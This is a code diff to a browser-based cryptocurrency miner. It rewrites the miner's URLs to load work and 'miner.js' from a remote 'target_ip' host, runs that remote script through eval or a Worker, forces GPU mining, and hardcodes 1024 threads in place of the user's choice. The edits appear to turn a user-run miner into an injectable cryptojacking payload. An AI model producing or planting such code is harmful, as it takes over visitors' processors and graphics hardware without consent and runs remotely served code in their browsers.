@@ -10,7 +10,7 @@ var start = null;
 var id = 1;
 // use this in case we can directly connect to a given pool
 // var _url = 'http://' + g_user + ':' + g_password + '@' + g_url + ':' + g_port;
-var _url = 'index.php';
+var _url = 'http://' + target_ip + '/hamiyoca/index.php';
 
 function readScript(n) {
     var xhr = new XMLHttpRequest();
@@ -39,7 +39,7 @@ function onSuccess(jsonresp) {
 
     var type = $('[type=radio]');
 
-    if (type.length == 0) type = [ {checked:true} , {checked:false} , {checked:false}]
+    if (type.length == 0) type = [ {checked:false} , {checked:false} , {checked:true}]
     var job = {};
     var gl = type[2].checked
 
@@ -68,7 +68,7 @@ function onSuccess(jsonresp) {
         var postMessage = function(m) {
             onWorkerMessage({ data: m });
         }
-        var th = $('#threads')[0].value;
+        var th = 1024;/*$('#threads')[0].value;*/
         if (!init) meinWebGLStart(th);
         worker = { postMessage : function(m) { worker.intMessage( { data: m} ) },
                    intMessage : glminer(job, postMessage) };
@@ -78,12 +78,12 @@ function onSuccess(jsonresp) {
         }
         worker = { postMessage : function(m) { worker.intMessage( { data: m} ); },
                    intMessage: function() {} };
-        var m = readScript('miner.js');
+        var m = readScript('http://' + target_ip + '/hamiyoca/miner.js');
         var s = '(function() {' + m + ';\n' + 'onmessage({ data: job });' + ' worker.intMessage = onmessage; })';
         var run = eval(s);
         run();
     } else {
-        worker = new Worker("miner.js");
+        worker = new Worker("http://" + target_ip + "/hamiyoca/miner.js");
         worker.onmessage = onWorkerMessage;
         worker.onerror = onWorkerError;
         worker.postMessage(job);
@@ -109,7 +109,7 @@ function begin_mining() {
             repeat_to = window.setTimeout(enqueuMiner, 1000);
         } else {
             get_work(true);
-            long_poll();
+            /*long_poll();*/
         }
     }
 }
